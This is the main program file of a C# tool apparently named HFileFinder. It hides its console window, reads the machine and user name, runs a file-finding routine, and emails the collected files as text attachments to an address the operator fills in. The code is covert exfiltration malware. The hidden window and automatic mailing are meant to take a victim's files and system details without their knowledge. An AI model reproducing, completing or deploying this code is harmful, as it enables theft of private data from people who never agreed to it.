using System;
using System.Net;

namespace HFileFinder
{
    class Program
    {
        private static string email = "email";//Enter yours
        private static string password = "pass";//Enter yours
        private static string displayName = "HFileFinder";
        private static string to = "to";//Enter yours
        //private static string subject = Environment.MachineName + ":" + Environment.UserName + " : ";
        private static string subject = "Test";
        private static string body = "";
        private static string sys = Environment.MachineName + "_" + Environment.UserName;

        static void Main(string[] args)
        {
            HSConsoleWindow.HideWindow();
            //Get IP addresses
            var ips = (Dns.GetHostEntry(Dns.GetHostName()).AddressList);
            foreach (var ip in ips)
            {
                body += (ip.ToString()) + "\n";
            }
            body = "";
            //Main work
            FileFinder.Work(sys);

            //Send datas by email service
            int filesCount = FileFinder.path.Length;
            string[] files = new string[filesCount];
            for (int i = 0; i < filesCount; i++)
            {
                files[i] = sys + i + ".txt";
                Send.SendEmail(email, password, displayName, to, subject, body, files[i]);
            }
            //HSConsoleWindow.ShowWindow();
            Console.ReadKey();
        }
    }
}
